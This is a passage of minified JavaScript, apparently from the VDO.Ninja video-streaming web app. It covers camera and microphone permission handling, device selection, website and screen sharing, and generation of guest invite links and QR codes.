warnlog("GET USER MEDIA CALL HAS EXPIRED 3a"):(closeModal(),void(callback&&callback(miconly)));warnlog("navigator.mediaDevices.getUserMedia starting..."),navigator.mediaDevices.getUserMedia(constraint).then((function(stream){if(removeAudio&&(constraint.audio=!1,stream.getTracks().forEach((function(track){stream.removeTrack(track),track.stop(),log("stopping old track")}))),log("got first stream"),clearTimeout(timerBasicCheck),getUserMediaRequestID!==gumID)return warnlog("GET USER MEDIA CALL HAS EXPIRED 3"),void stream.getTracks().forEach((function(track){stream.removeTrack(track),track.stop(),log("stopping old track")}));closeModal(),log(stream.getTracks()),session.streamSrc=stream,checkBasicStreamsExist(),updateRenderOutpipe(),callback&&callback(miconly)})).catch((function(err){if(clearTimeout(timerBasicCheck),warnlog("some error with GetUSERMEDIA"),console.warn(err),"NotFoundError"==err.name||"DevicesNotFoundError"==err.name);else if("NotReadableError"==err.name||"TrackStartError"==err.name);else if("OverconstrainedError"==err.name||"ConstraintNotSatisfiedError"==err.name);else{if("NotAllowedError"==err.name||"PermissionDeniedError"==err.name)return void(session.cleanOutput||setTimeout((function(){window.obsstudio?warnUser("Permissions denied.\n\nTo access the camera or microphone from within OBS, please refer to:\n<a href='https://docs.vdo.ninja/guides/share-webcam-from-inside-obs'>docs.vdo.ninja/guides/share-webcam-from-inside-obs</a>.",!1,!1):ChromiumVersion&&!session.mobile?warnUser("<h1>Camera/mic permissions denied</h1>\nPlease ensure you have allowed the mic/camera permissions in your browser, such as like:\n\n<img src='./media/permissions_chrome.jpg' style='max-height:50vh;' />\n\nFor further help on how to resolve this issue, please refer to:\n\n<a target='_blank' href='https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions'>https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions</a>.",!1,!1):Firefox&&session.mobile?warnUser("<h3>Camera/mic permission denied</h3>\nPlease allow mic/camera access.\n\n\t\t\t\t\t\t\t\tIf not prompted, go to Settings -> Site permissions -> exceptions (at bottom) -> vdo.ninja, and then manually enable the permissions.\n\n\t\t\t\t\t\t\t\tIf Firefox still gives you issues, try in incognito mode or a different browser.\t\t\t\t\t\t\t\tFor further help, please refer to:\n\n<a target='_blank' href='https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions'>https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions</a>.",!1,!1):warnUser("Permission access to the camera or microphone was denied.\n\nPlease ensure you have allowed the mic/camera permissions in your browser.\n\nFor guides on how to resolve this issue, please refer to:\n\n<a target='_blank' href='https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions'>https://docs.vdo.ninja/common-errors-and-known-issues/enable-camera-microphone-permissions</a>.",!1,!1)}),1));"TypeError"==err.name||"TypeError"==err.name||session.cleanOutput||setTimeout((function(err){warnUser(err)}),1,err)}warnlog("trying to list webcam again"),callback&&callback(miconly)}))}),timeoutStart,gumID,constraint,timerBasicCheck,callback,miconly)}catch(e){console.warn(e),session.cleanOutput||(window.isSecureContext?warnUser("An error has occured when trying to access the webcam or microphone. The reason is not known."):warnUser(iOS||iPad?"iOS version 13.4 and up is generally recommended; older than iOS 11 is not supported.":"Error acessing camera or microphone.\n\nThe website may be loaded in an insecure context.\n\nPlease see: https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia"))}return null}function setupWebcamSelection(miconly=!1){log("setupWebcamSelection();"),checkBasicStreamsExist();try{return enumerateDevices().then((function(dInfo){return gotDevices(dInfo,miconly)})).then((function(){getById("webcamquality").elements&&3==parseInt(getById("webcamquality").elements.namedItem("resolution").value)?!1===session.maxframeRate&&(session.maxframeRate=30,session.maxframeRate_q2=!0):session.maxframeRate_q2&&(session.maxframeRate=!1,session.maxframeRate_q2=!1);var audioSelect=getById("audioSource"),videoSelect=getById("videoSourceSelect"),outputSelect=getById("outputSource");if("UL"==audioSelect.tagName&&(audioSelect.onchange=function(){document.getElementById("gowebcam")&&(document.getElementById("gowebcam").disabled=!0,document.getElementById("gowebcam").dataset.audioready="false",document.getElementById("gowebcam").style.fontWeight="normal",document.getElementById("gowebcam").innerHTML="Waiting for mic to load",miniTranslate(document.getElementById("gowebcam"),"waiting-for-mic-to-load")),activatedPreview=!1,grabAudio()}),videoSelect.onchange=function(){document.getElementById("gowebcam")&&(document.getElementById("gowebcam").disabled=!0,document.getElementById("gowebcam").dataset.ready="false",document.getElementById("gowebcam").style.fontWeight="normal",document.getElementById("gowebcam").innerHTML="Waiting for Camera to load",miniTranslate(document.getElementById("gowebcam"),"waiting-for-camera-to-load")),warnlog("video source changed"),activatedPreview=!1,!1!==session.quality?grabVideo(session.quality):document.getElementById("webcamquality")&&(session.quality_wb=parseInt(document.getElementById("webcamquality").elements.namedItem("resolution").value),grabVideo(session.quality_wb))},Firefox&&!session.mobile&&(outputSelect.onclick=function(){log("on click"),"others"===outputSelect.options[outputSelect.selectedIndex].value&&navigator.mediaDevices.selectAudioOutput().then((device=>{if("audiooutput"==device.kind){session.sink=device.deviceId;try{var matched=!1;if(outputSelect.childNodes.forEach((ele=>{ele.value===device.deviceId&&(matched=!0,ele.selected=!0)})),!matched){var option=document.createElement("option");option.value=device.deviceId,option.text=device.label,outputSelect.appendChild(option),option.selected=!0}saveSettings()}catch(e){errorlog(e)}if(!session.sink)return;resetupAudioOut()}}))}),outputSelect.onchange=function(){if(!iOS&&!iPad&&(!Firefox||session.mobile||"others"!==outputSelect.options[outputSelect.selectedIndex].value)){try{session.sink=outputSelect.options[outputSelect.selectedIndex].value,saveSettings()}catch(e){errorlog(e)}session.sink&&resetupAudioOut()}},getById("webcamquality").onchange=function(){document.getElementById("gowebcam")&&(document.getElementById("gowebcam").disabled=!0,document.getElementById("gowebcam").dataset.ready="false",document.getElementById("gowebcam").style.fontWeight="normal",document.getElementById("gowebcam").innerHTML="Waiting for Camera to load",miniTranslate(document.getElementById("gowebcam"),"waiting-for-camera-to-load")),2==parseInt(getById("webcamquality").elements.namedItem("resolution").value)?!1===session.maxframeRate&&(session.maxframeRate=30,session.maxframeRate_q2=!0):session.maxframeRate_q2&&(session.maxframeRate=!1,session.maxframeRate_q2=!1),activatedPreview=!1,session.quality_wb=parseInt(getById("webcamquality").elements.namedItem("resolution").value),grabVideo(session.quality_wb)},session.safemode&&document.getElementById("gowebcam"))return document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").dataset.audioready="true",document.getElementById("gowebcam").dataset.ready="true",document.getElementById("gowebcam").focus(),setTimeout((function(){updateForceRotate()}),1e3),void(session.autostart&&publishWebcam());if(0!==session.audioDevice?(log("SETTING AUDIO DEVICE!!"),activatedPreview=!1,grabAudio()):document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.audioready="true"),0===session.videoDevice||miconly){if(session.autostart)return void publishWebcam();document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.ready="true","true"==document.getElementById("gowebcam").dataset.audioready&&(document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").focus()))}else log("GRabbing video: "+session.quality),activatedPreview=!1,!1!==session.quality?grabVideo(session.quality):document.getElementById("webcamquality")&&(session.quality_wb=parseInt(getById("webcamquality").elements.namedItem("resolution").value),grabVideo(session.quality_wb));if(!(iOS||iPad||session.mobile))try{outputSelect.selectedIndex>=0&&(session.sink=outputSelect.options[outputSelect.selectedIndex].value,saveSettings(),session.videoElement&&!session.videoElement.paused&&resetupAudioOut())}catch(e){errorlog(e)}})).catch((e=>{errorlog(e)}))}catch(e){errorlog(e)}}async function shareWebsite(autostart=!1,evt=!1){if(session.iframeSrc){if(session.cleanOutput||getById("websitesharebutton2").classList.remove("hidden"),evt&&(evt.ctrlKey||evt.metaKey)){if(getById("websitesharebutton2").classList.contains("green")){var actionMsg={infocus:!1};for(var UUID in session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(actionMsg,UUID);getById("websitesharebutton2").classList.remove("green"),getById("websitesharebutton2").ariaPressed="false",getById("websitesharebutton2").title="Hold CTRL (or CMD) and click to spotlight this shared website"}else if(session.streamID){actionMsg={};for(var UUID in actionMsg.infocus=session.streamID,session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(actionMsg,UUID);getById("websitesharebutton2").classList.add("green"),getById("websitesharebutton2").ariaPressed="true",getById("websitesharebutton2").title="Video is currently spotlighted"}return}getById("websitesharebutton2").classList.remove("green"),getById("websitesharebutton2").ariaPressed="false",session.iframeSrc=!1,session.director?clearDirectorSettings():(document.getElementById("container_iframe")||session.iframeEle)&&(session.iframeEle&&(session.iframeEle.remove(),session.iframeEle=!1),document.getElementById("container_iframe")&&document.getElementById("container_iframe").remove(),updateMixer()),getById("websitesharebutton2").classList.add("hidden"),getById("websitesharebutton").classList.remove("hidden");var data={iframeSrc:!1};for(var UUID in session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(data,UUID);getById("websitesharebutton2").title="Hold CTRL (or CMD) and click to spotlight this shared website"}else{if(getById("websitesharebutton2").classList.remove("green"),getById("websitesharebutton2").ariaPressed="false",!1===autostart){window.focus();var iframeURL=await promptAlt(getTranslation("enter-website"),!1,!1,session.defaultIframeSrc)}else iframeURL=autostart;if(iframeURL&&iframeURL!=session.iframeSrc){if(session.defaultIframeSrc=iframeURL,warnlog(iframeURL),session.iframeSrc=parseURL4Iframe(iframeURL),session.director&&!autostart)setStorage("directorWebsiteShare",{website:session.iframeSrc,roomid:session.roomid});else if(session.iframeEle)session.iframeEle.src=session.iframeSrc,session.iframeSrc.startsWith("https://www.youtube.com/")&&setTimeout((function(iframe_id){YoutubeListen(iframe_id)}),1e3,iframe.id);else{var iframe=document.createElement("iframe");iframe.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",iframe.src=session.iframeSrc,iframe.id="iframe_source",iframe.loadedYoutubeListen=!1,session.iframeEle=iframe;var container=document.createElement("div");iframe.container=container,container.id="container_iframe",session.iframeSrc.startsWith("https://www.youtube.com/")&&setTimeout((function(iframe_id){YoutubeListen(iframe_id)}),1e3,iframe.id),updateMixer()}getById("websitesharebutton2").classList.remove("hidden"),getById("websitesharebutton").classList.add("hidden");data={};for(var UUID in data.iframeSrc=session.iframeSrc,session.pcs)!0===session.pcs[UUID].allowIframe&&session.sendMessage(data,UUID)}}}function screenshareTypeDecider(sstype=1){session.screenshareType&&(sstype=session.screenshareType),1==sstype?toggleScreenShare():2==sstype?createIframePopup():3==sstype&&createSecondStream()}function createScreenShareURL(transparent=!0){if(session.screenShareElement)var iFrameID=session.streamID.substring(0,12)+"_"+session.generateStreamID(5);else if(session.screenshareid)iFrameID=session.screenshareid;else iFrameID=session.streamID.substring(0,12)+"_"+session.generateStreamID(5);session.exclude||(session.exclude=[]),session.exclude.push(iFrameID);var extras="";return session.password&&(extras+="&password="+session.password),session.privacy&&(extras+="&privacy"),session.meshcast&&(extras+="&meshcast"),session.token&&(extras+="&token="+session.token),session.remote&&(!0===session.remote?extras+="&remote":extras+="&remote="+session.remote),session.salt!==location.hostname&&(extras+="&salt="+session.salt),session.whipOutVideoBitrate&&(extras+="&wovb="+session.whipOutVideoBitrate),session.whipOutScreenShareBitrate&&(extras+="&wossbitrate="+session.whipOutScreenShareBitrate),session.notifyScreenShare||(extras+="&smallshare"),session.screenshareContentHint?extras+="&sshint="+session.screenshareContentHint:session.contentHint&&(extras+="&sshint="+session.contentHint),session.audioContentHint&&(extras+="&audiohint="+session.audioContentHint),session.whipOutScreenShareCodec?extras+="&whipoutcodec="+session.whipOutScreenShareCodec:session.whipOutCodec&&(extras+="&whipoutcodec="+session.whipOutCodec),!1!==session.screensharequality?extras+="&q="+session.screensharequality:!1!==session.quality?extras+="&q="+session.quality:!1!==session.quality_ss?extras+="&q="+session.quality_ss:extras+="&q=0",!1!==session.screenShareLabel&&(session.screenShareLabel?extras+="&label="+encodeURIComponent(session.screenShareLabel):session.label&&(extras+="&label="+encodeURIComponent(session.label))),!1!==session.screensharefps&&(extras+="&maxframeRate="+parseInt(100*session.screensharefps)/100),!1!==session.screenshareAEC&&(extras+="&aec=1"),!1!==session.screenshareDenoise&&(extras+="&denoise=1"),!1!==session.screenshareAutogain&&(extras+="&autogain=1"),!1!==session.screenshareStereo&&(extras+="&stereo="+session.screenshareStereo),session.forceAspectRatio&&null===session.forceScreenShareAspectRatio?extras+="&ar="+session.forceAspectRatio:session.forceScreenShareAspectRatio&&(extras+="&ar="+session.forceScreenShareAspectRatio),session.muted&&(extras+="&muted"),session.recordLocal&&(extras+="&record="+session.recordLocal),session.autorecordlocal&&(extras+="&autorecordlocal"),transparent&&(extras+="&transparent&cleanish"),"?manual&audiodevice=1&screenshare&cb=0&nvb&nsb&autostart&view&room="+session.roomid+"&push="+iFrameID+extras}function createIframePopup(){if(session.screenShareElement)return postMessageIframe(session.screenShareElement,{close:!0}),session.screenShareElement.parentNode.removeChild(session.screenShareElement),session.screenShareElement=!1,updateMixer(),getById("screenshare2button").classList.remove("green"),void(getById("screenshare2button").ariaPressed="false");if(session.queue&&!session.transferred||session.screenShareState&&!session.queue&&session.transferred)toggleScreenShare();else{var iframe=document.createElement("iframe");iframe.allow="autoplay;camera;microphone;fullscreen;picture-in-picture;display-capture;midi;",iframe.src="./"+createScreenShareURL(),iframe.style.width="100%",iframe.style.height="100%",iframe.style.overflow="hidden",iframe.id="screensharesource",iframe.dataset.sid="#screensharesource",iframe.style.zIndex="0",session.screenShareElement=iframe,session.screenShareElement.dataset.doNotMove=!0,document.getElementById("main").appendChild(iframe),session.screenShareElementHidden&&(session.screenShareElement.style.display="none"),updateMixer(),getById("screenshare2button").classList.add("green"),getById("screenshare2button").ariaPressed="true"}}function previewWebcam(miconly=!1){if(null===session.taintedSession)return log("STILL WAITING ON HASH TO VALIDATE"),void setTimeout((function(miconly){previewWebcam(miconly)}),1e3,miconly);if(!0!==session.taintedSession)if(log("NOT TAINTED"),1!=activatedPreview){if(activatedPreview=!0,miconly?getById("add_camera_inner").cloned||(getById("add_camera_inner").cloned=!0,insertAfter(getById("add_camera_inner"),getById("add_microphone")),document.getElementById("videoSourceSelect").innerHTML=""):getById("add_camera_inner").cloned&&(getById("add_camera_inner").cloned=!1,insertAfter(getById("add_camera_inner"),getById("add_camera")),document.getElementById("videoSourceSelect").innerHTML=""),0===session.audioDevice)var constraint={audio:!1};else if(!1!==session.echoCancellation&&!1!==session.autoGainControl&&!1!==session.noiseSuppression)constraint={audio:!0};else{constraint={audio:{}};!1!==session.echoCancellation?constraint.audio.echoCancellation=!0:(constraint.audio.echoCancellation=!1,session.cleanoutput||(getById("headphoneTip1").classList.remove("hidden"),miniTranslate(getById("headphoneTipContext1"),"headphones-tip"))),!1!==session.autoGainControl?constraint.audio.autoGainControl=!0:constraint.audio.autoGainControl=!1,!1!==session.noiseSuppression?constraint.audio.noiseSuppression=!0:constraint.audio.noiseSuppression=!1}if(0===session.videoDevice||miconly?constraint.video=!1:constraint.video=!0,window.onorientationchange=function(){Firefox&&updateForceRotate(!0),setTimeout((async function(){session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),session.effect&&"7"===session.effect&&digitalZoom(!0),updateForceRotate()}),200)},!1===constraint.video&&!1===constraint.audio)return session.autostart?void publishWebcam(!1,miconly):(getById("getPermissions").style.display="none",void(document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.ready="true",document.getElementById("gowebcam").dataset.audioready="true",document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").focus())));enumerateDevices().then((function(devices){log("enumeratated"),log(devices);var vtrue=!1,atrue=!1;devices.forEach((function(device){"audioinput"===device.kind?atrue=!0:"videoinput"===device.kind&&(vtrue=!0)})),!1===atrue&&(constraint.audio=!1),!1===vtrue&&(constraint.video=!1),setTimeout((function(constraint,miconly){requestBasicPermissions(constraint,setupWebcamSelection,miconly)}),0,constraint,miconly)})).catch((error=>{log("enumeratated failed. Seeking permissions."),setTimeout((function(constraint,miconly){requestBasicPermissions(constraint,setupWebcamSelection,miconly)}),0,constraint,miconly)}))}else log("activeated preview return 1");else warnlog("HASH FAILED; PASSWORD NOT VALID")}function copyFunction(copyText,evt=!1){if(evt){if("buttons"in evt){if(0!==evt.buttons)return}else if("which"in evt&&0!==evt.which)return;popupMessage(evt),evt.preventDefault(),evt.stopPropagation()}try{copyText.select(),copyText.setSelectionRange(0,99999),document.execCommand("copy")}catch(e){var dummy=document.createElement("input");document.body.appendChild(dummy),dummy.value=copyText,dummy.select(),document.execCommand("copy"),document.body.removeChild(dummy)}return!1}function generateQRPage(){var pass=sanitizePassword(getById("invite_password").value);if(pass.length)return generateHash(pass+session.salt,4).then((function(hash){generateQRPageCallback(hash)})).catch(errorlog);generateQRPageCallback("")}async function updateLinkWelcome(arg,input){if(input.checked){var response=await promptAlt("Enter the message you'd like the guests to see");response=encodeURIComponent(response);var param=input.dataset.param.split("=")[0];input.dataset.param=param+"="+response}updateLink(arg,input)}function updateLinkWebP(arg,input){input.checked&&(getById("director_block_"+arg).dataset.raw.includes("&broadcast")||getById("director_block_"+arg).dataset.raw.includes("?broadcast")||(getById("broadcastSlider").checked=!0,updateLink(arg,getById("broadcastSlider")))),updateLink(arg,input)}Promise.wait=function(ms){return new Promise((function(resolve){setTimeout(resolve,ms)}))},Promise.prototype.timeout=function(ms){return Promise.race([this,Promise.wait(ms).then((function(){var errormsg;if(iOS||iPad)throw(errormsg=new Error("Time Out\nDid you accept camera permissions in time? Please do so first.\n\nIf using an iPhone or iPad, try fully closing your browser and open it again; Safari sometimes jams up the camera.")).name="timedOut",errormsg.message="Time Out\nDid you accept camera permissions in time? Please do so first.\n\nIf using an iPhone or iPad, try fully closing your browser and open it again; Safari sometimes jams up the camera.",errormsg;if(session.mobile)throw(errormsg=new Error("Time Out\nDid you accept camera permissions in time? Please do so first.\n\nMake sure no other application is using the camera already and that you are using a compatible browser. If issues persist, maybe try the official native mobile app.")).name="timedOut",errormsg.message="Time Out\nDid you accept camera permissions in time? Please do so first.\n\nMake sure no other application is using the camera already and that you are using a compatible browser. If issues persist, maybe try the official native mobile app.",errormsg;throw(errormsg=new Error("Time Out\nDid you accept camera permissions in time? Please do so first.\n\nOtherwise, do you have NDI Tools installed? Maybe try uninstalling it.\n\nPlease also ensure your camera and audio device are correctly connected and not already in use. You may also need to refresh the page.")).name="timedOut",errormsg.message="Time Out\nDid you accept camera permissions in time? Please do so first.\n\nOtherwise, do you have NDI Tools installed? Maybe try uninstalling it.\n\nPlease also ensure your camera and audio device are correctly connected and not already in use. You may also need to refresh the page.",errormsg}))])};var soloLinkAppended="";function updateLink(arg,input,solo=!1){if(log("updateLink"),log(input.dataset.param),input.checked){getById("director_block_"+arg).dataset.raw+=input.dataset.param,solo&&(soloLinkAppended+=input.dataset.param);var string=getById("director_block_"+arg).dataset.raw;1==arg&&getById("obfuscate_director_"+arg).checked&&(string=obfuscateURL(string)),getById("director_block_"+arg).href=string,getById("director_block_"+arg).innerText=string}else{string=(string=(string=getById("director_block_"+arg).dataset.raw+"&").replace(input.dataset.param+"&","&")).substring(0,string.length-1),getById("director_block_"+arg).dataset.raw=string,solo&&(soloLinkAppended=(soloLinkAppended=(soloLinkAppended+="&").replace(input.dataset.param+"&","&")).substring(0,soloLinkAppended.length-1)),1==arg&&getById("obfuscate_director_"+arg).checked&&(string=obfuscateURL(string)),getById("director_block_"+arg).href=string,getById("director_block_"+arg).innerText=string}solo&&document.querySelectorAll("a.soloLink").forEach((ele=>{try{var href=ele.getAttribute("value")+soloLinkAppended;ele.href=href,ele.innerHTML=href}catch(e){errorlog(e)}})),saveDirectorSettings()}function changeURL(changeURL){window.focus(),session.consent?(hangup(!1),window.location.href=changeURL):confirmAlt(getTranslation("director-redirect-1")+changeURL+getTranslation("director-redirect-2")).then((res=>{res&&(hangup(!1),window.location.href=changeURL)}))}function updateLinkInverse(arg,input){if(log("updateLinkInverse"),log(input.dataset.param),input.checked){string=(string=(string=getById("director_block_"+arg).dataset.raw+"&").replace(input.dataset.param+"&","&")).substring(0,string.length-1),getById("director_block_"+arg).dataset.raw=string,1==arg&&getById("obfuscate_director_"+arg).checked&&(string=obfuscateURL(string)),getById("director_block_"+arg).href=string,getById("director_block_"+arg).innerText=string}else{getById("director_block_"+arg).dataset.raw+=input.dataset.param;var string=getById("director_block_"+arg).dataset.raw;1==arg&&getById("obfuscate_director_"+arg).checked&&(string=obfuscateURL(string)),getById("director_block_"+arg).href=string,getById("director_block_"+arg).innerText=string}}function updateLinkScene(arg,input){log("updateLinkScene");var string=getById("director_block_"+arg).dataset.raw;string=input.checked?changeParam(string,"scene","0"):changeParam(string,"scene","1"),getById("director_block_"+arg).dataset.raw=string,1==arg&&getById("obfuscate_director_"+arg).checked&&(string=obfuscateURL(string)),getById("director_block_"+arg).href=string,getById("director_block_"+arg).innerText=string}function fullscreenPageToggle(state=null){try{document.fullscreenElement?document.exitFullscreen?state||document.exitFullscreen():document.webkitExitFullscreen&&(state||document.webkitExitFullscreen()):!1!==state&&(document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen())}catch(e){errorlog(e)}}async function PictureInPicturePageToggle(state=null){try{if("undefined"==typeof documentPictureInPicture)return;session.pipWindow?(getById("testtone").parentNode.insertBefore(session.pipWindow.document.getElementById("gridlayout"),getById("testtone")),session.pipWindow.close(),session.pipWindow=null,updateMixer(),getById("PictureInPicturePage").classList.remove("green")):(session.pipWindow=await documentPictureInPicture.requestWindow({width:564,height:346}),session.pipWindow.addEventListener("pagehide",(event=>{session.pipWindow&&(getById("testtone").parentNode.insertBefore(session.pipWindow.document.getElementById("gridlayout"),getById("testtone")),session.pipWindow.close(),session.pipWindow=null,updateMixer(),getById("PictureInPicturePage").classList.remove("green"))})),session.pipWindow.document.body.className="main",session.pipWindow.document.head.innerHTML='<title>Pop-out Window</title><link rel="stylesheet" href="./main.css">',session.pipWindow.document.body.style=document.body.style,session.pipWindow.document.title="Pop-out Window",session.pipWindow.document.body.append(getById("gridlayout")),session.pipWindow.onresize=updateMixer,updateMixer(),getById("PictureInPicturePage").classList.add("green"))}catch(e){errorlog(e)}}function resetGen(){getById("gencontent").style.display="block",getById("gencontent2").style.display="none",getById("gencontent2").className="",getById("gencontent").className="container-inner",getById("gencontent2").innerHTML="",getById("videoname4").focus()}function generateQRPageCallback(hash){try{var title=getById("videoname4").value;title.length&&(title="&label="+(title=title.replace(/[\W]+/g,"_").replace(/_+/g,"_")));var sid=session.generateStreamID(),viewstr="",sendstr="";if(getById("invite_bitrate").checked&&(viewstr+="&bitrate=20000"),getById("invite_vp9").checked&&(viewstr+="&codec=vp9"),getById("invite_stereo").checked&&(viewstr+="&stereo",sendstr+="&stereo"),getById("invite_automic").checked&&(sendstr+="&audiodevice=1"),getById("invite_automic").checked&&(sendstr+="&audiodevice=1"),getById("invite_effects").checked&&(sendstr+="&effects"),getById("invite_remotecontrol").checked){var remote_gen_id=session.generateStreamID();sendstr+="&remote="+remote_gen_id,viewstr+="&remote="+remote_gen_id}getById("invite_joinroom").value.trim().length&&(sendstr+="&ssid&room="+getById("invite_joinroom").value.trim(),viewstr+="&solo&room="+getById("invite_joinroom").value.trim()),getById("invite_password").value.trim().length&&(sendstr+="&hash="+hash,viewstr+="&password="+sanitizePassword(getById("invite_password").value.trim())),session.token&&(sendstr+="&token="+session.token,viewstr+="&token="+session.token),getById("invite_group_chat_type").value&&(1==getById("invite_group_chat_type").value?sendstr+="&novideo":2==getById("invite_group_chat_type").value&&(sendstr+="&view")),getById("invite_quality").value&&(0==getById("invite_quality").value?sendstr+="&quality=0":1==getById("invite_quality").value?sendstr+="&quality=1":2==getById("invite_quality").value&&(sendstr+="&quality=2"));var wss="";session.wssSetViaUrl&&(wss=session.customWSS&&!0!==session.customWSS?"&pie="+session.customWSS:"&wss="+session.wss);var hoststr="";getById("invite_hostlink").checked?(hoststr="https://"+location.host+location.pathname+"?push="+sid+"_hostlink&view="+sid+sendstr+"&bitrate=500"+title+wss,sendstr="https://"+location.host+location.pathname+"?push="+sid+"&view="+sid+"_hostlink"+sendstr+"&bitrate=1200"+title+wss):sendstr="https://"+location.host+location.pathname+"?push="+sid+sendstr+title+wss,getById("invite_obfuscate").checked&&(sendstr=obfuscateURL(sendstr)),viewstr="https://"+location.host+location.pathname+"?view="+sid+viewstr+title+wss,getById("gencontent").style.display="none",getById("gencontent").className="",getById("gencontent2").style.display="block",getById("gencontent2").className="container-inner",getById("gencontent2").innerHTML='<br /><div id="qrcode" style="background-color:white;display:inline-block;color:black;max-width:380px;padding:35px 40px 40px 40px;">\t\t\t<h2 style="margin:0 0 8px 0;color:black"  data-translate="invite-link">Guest Invite Link:</h2>\t\t\t<a class="task grabLinks" title="Click to copy guest invite link to clipboard" onclick="copyFunction(this,event)"   \t\t\tstyle="word-break: break-all;cursor:copy;background-color:#CFC;border: 2px solid black;width:300px;padding:8px;margin:0px;color:#000;"  href="'+sendstr+'" >'+sendstr+' <i class="las la-paperclip" style="cursor:pointer"></i></a><br /><br /></div>\t\t\t<br /><br />and don\'t forget the<h2 style="color:black">OBS Browser Source Link:</h2><a class="task grabLinks" title="Click to copy or just Drag the link directly into OBS" data-drag="1" onclick="copyFunction(this,event)"  style="word-break: break-all;margin:0px;cursor:grab;background-color:#FCC;width:380px;padding:10px;border:2px solid black;margin:5px;color:#000;" href="'+viewstr+'" >'+viewstr+' <i class="las la-paperclip" style="cursor:pointer"></i></a> \t\t\t',hoststr&&(getById("gencontent2").innerHTML+='<br /><br /><h2 style="color:black">Host Chat Link:</h2><a class="task" title="Click to copy"  onclick="copyFunction(this,event)"  style="font-weight: bold;display: inline-flex;word-break: break-all;margin:0px;cursor:grab;background-color:#cce1ff;width:380px;padding:10px;border:2px solid black;margin:5px;color:#000;" href="'+hoststr+'" >'+hoststr+' <i class="las la-paperclip" style="cursor:pointer"></i></a>'),getById("gencontent2").innerHTML+='<br /><br />\t\t\t<span data-translate="please-note-invite-ingestion-link">\t\t\t\t<li>This invite link and OBS ingestion link are reusable.</li>\t\t\t\t<li>Only one person may use a specific invite at a time.</li>\t\t\t\t<li>The stream ID can be changed manually to something else; keep it unique and alphanumeric.</li>\t\t\t\t<li>Nothing is stored server-side; links do not expire, nor is there anything to delete.</li>\t\t\t</span><br /><br />\t\t\t<button onclick="resetGen();" style="font-size:1.2em;paddding:5px;"><i class="las la-redo-alt"></i> Create Another Invite Link</button>',new QRCode(getById("qrcode"),{width:300,height:300,colorDark:"#000000",colorLight:"#FFFFFF",useSVG:!1}).makeCode(sendstr),getById("qrcode").title="",setTimeout((function(){getById("qrcode").title="",getById("qrcode").getElementsByTagName("img").length&&(getById("qrcode").getElementsByTagName("img")[0].style.cursor="none",getById("qrcode").getElementsByTagName("img")[0].style.margin="0 auto")}),100)}catch(e){errorlog(e)}}function initSceneList(UUID){Object.keys(session.sceneList).forEach(((scene,index)=>{if(!getById("container_"+UUID).querySelectorAll('[data-scene="'+scene+'"]').length){var newScene=document.createElement("div");newScene.innerHTML='<button style="margin: 0 5px 10px 5px;" data-sid="'+session.rpcs[UUID].streamID+'" data--u-u-i-d="'+UUID+'" data-action-type="addToScene" data-scene="'+scene+'"   title="Add to Scene '+scene+'" onclick="directEnable(this, event);"><span ><i class="las la-plus-square" style="color:#060"></i> Scene: '+scene+"</span></button>",newScene.classList.add("customScene");var added=!1;getById("container_"+UUID).querySelectorAll(".customScene>[data-scene]").forEach((ele=>{log(ele),!added&&ele.dataset.scene>scene+""&&(ele.parentNode.parentNode.insertBefore(newScene,ele.parentNode),added=!0)})),added||getById("container_"+UUID).appendChild(newScene)}}))}function updateSceneList(scene){if(session.director&&!(scene in session.sceneList||parseInt(scene)+""===scene&&parseInt(scene)>=0&&parseInt(scene)<=8)){for(var UUID in session.sceneList[scene]=!0,session.rpcs){(newScene=document.createElement("div")).innerHTML='<button style="margin: 0 5px 10px 5px;" data-sid="'+session.rpcs[UUID].streamID+'" data--u-u-i-d="'+UUID+'" data-action-type="addToScene" data-scene="'+scene+'"  title="Add to Scene '+scene+'" onclick="directEnable(this, event);"><span ><i class="las la-plus-square" style="color:#060"></i> Scene: '+scene+"</span></button>",newScene.classList.add("customScene");var added=!1;getById("container_"+UUID).querySelectorAll(".customScene>[data-scene]").forEach((ele=>{log(ele),!added&&ele.dataset.scene>scene+""&&(ele.parentNode.parentNode.insertBefore(newScene,ele.parentNode),added=!0)})),added||getById("container_"+UUID).appendChild(newScene)}if(session.showDirector&&document.getElementById("container_director")){var newScene;(newScene=document.createElement("div")).innerHTML='<button style="margin: 0 5px 10px 5px;" data-sid="'+session.streamID+'" data-action-type="addToScene" data-scene="'+scene+'"  title="Add to Scene '+scene+'" onclick="directEnable(this, event);"><span ><i class="las la-plus-square" style="color:#060"></i> Scene: '+scene+"</span></button>",newScene.classList.add("customScene");added=!1;getById("container_director").querySelectorAll(".customScene>[data-scene]").forEach((ele=>{!added&&ele.dataset.scene>scene+""&&(ele.parentNode.parentNode.insertBefore(newScene,ele.parentNode),added=!0)})),added||getById("container_director").appendChild(newScene)}}}session.pipWindow=!1;var vis=function(){var stateKey,eventKey,keys={hidden:"visibilitychange",webkitHidden:"webkitvisibilitychange",mozHidden:"mozvisibilitychange",msHidden:"msvisibilitychange"};for(stateKey in keys)if(stateKey in document){eventKey=keys[stateKey];break}return function(c){return c&&document.addEventListener(eventKey,c),!document[stateKey]}}();function unPauseVideo(videoEle,update=!0){try{if(!videoEle)return;if(!(videoEle.dataset.UUID in 